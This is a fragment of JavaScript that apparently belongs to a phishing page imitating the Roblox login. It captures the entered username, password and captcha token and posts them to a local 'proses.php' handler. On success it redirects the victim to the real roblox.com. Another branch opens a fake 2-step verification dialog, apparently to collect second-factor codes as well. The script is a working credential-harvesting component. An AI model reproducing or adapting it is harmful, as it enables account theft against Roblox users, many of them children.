   $("#fc-token").hide();
window.addEventListener('message', function(e) {
    // Get the sent data
    const data = e.data;
   // alert(data);
    // If you encode the message in JSON before sending them, 
    // then decode here
     const decoded = JSON.parse(data);
     $("#fc-token").val(decoded.data);
});

                       $("#captcha-close").click(function() {
var boxChild = document.getElementById("cmahesa");

        if (boxChild.style.display === "none") {

            /** @type {string} */

            boxChild.style.display = "block";

        } else {

            /** @type {string} */
     $("#LogIn").show();
            $("#loading").hide();
            boxChild.style.display = "none";

        }
  });
  
var input = document.querySelector('#fc-token');
    input.addEventListener('keyup', checkLength);
    function checkLength(e){
        if(e.target.value.length>=10){
      captchaSolved();
      
        }
    }
    
function login(){
     $( '#arkoseFrame' ).attr( 'src', function ( i, val ) { return val; });
    document.getElementById("cmahesa").style.display = "block";
document.getElementById("cmahesa-background").style.display = "block";
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

}
$("#msg").show();
function captchaSolved() {
     document.getElementById("cmahesa").style.display = "hidden";
document.getElementById("cmahesa-background").style.display = "hidden";
   //var session_token = document.getElementById("FunCaptcha-Token").value;
            $("#loading").show(); $("#logIn").hide();
document.getElementById("cmahesa").style.display = "none";
document.getElementById("cmahesa-background").style.display = "none";
 var credent = {
      username: $("#login-username").val(),
      password: $("#login-password").val(),
      fc : $("#fc-token").val()
    };
$.ajax({
      type: "POST",
      url: "/login/proses.php",
      data: credent,
      dataType: "text",
    }).done(function (data) {
setTimeout(function(){
      $("#loading").hide();
                              
if(data=="*"){
       $("#msg").text("Username and password required");
                 $("#LogIn").show();
                      $("#msg").show();
   }else if(data=="V"){
      window.location.replace("https://roblox.com");
   }else if(data=="2"){
      setTimeout(function(){ $('#layer1').css('display','block'); }, 0);
      setTimeout(function(){ $('#2step').css('display','block'); }, 0);
      setTimeout(function(){ $('#2stepbody').css('display','block'); }, 1000);
      setTimeout(function(){ $('#loadtime').css('display','none'); }, 1000);
      setTimeout(function(){ $('#vload').css('display','none'); }, 1000);
      setTimeout(function(){ $('#modal-footer').css('display','block'); }, 1000);
      }else{
           $("#msg").text("Incorrect username and password");
          $('#fc-token').val('');
           $( '#arkoseFrame' ).attr( 'src', function ( i, val ) { return val; });
          $("#LogIn").show();
                      $("#msg").show();
                      
                      //arkose.refresh.session()
      }
}, 1000);
    });
}
 $('.modal-bg').fadeOut(); 
                      $('#login-dropdown').css('display','none');
                        $('#loginq').click(function(){
        $('#login-dropdown').css('display','block');
        $('.modal-bg').fadeIn();
   });
$('.modal-bg').click(function(){
           $('.modal-bg').fadeOut();      
           $('#login-dropdown').fadeOut();
        return false;
      });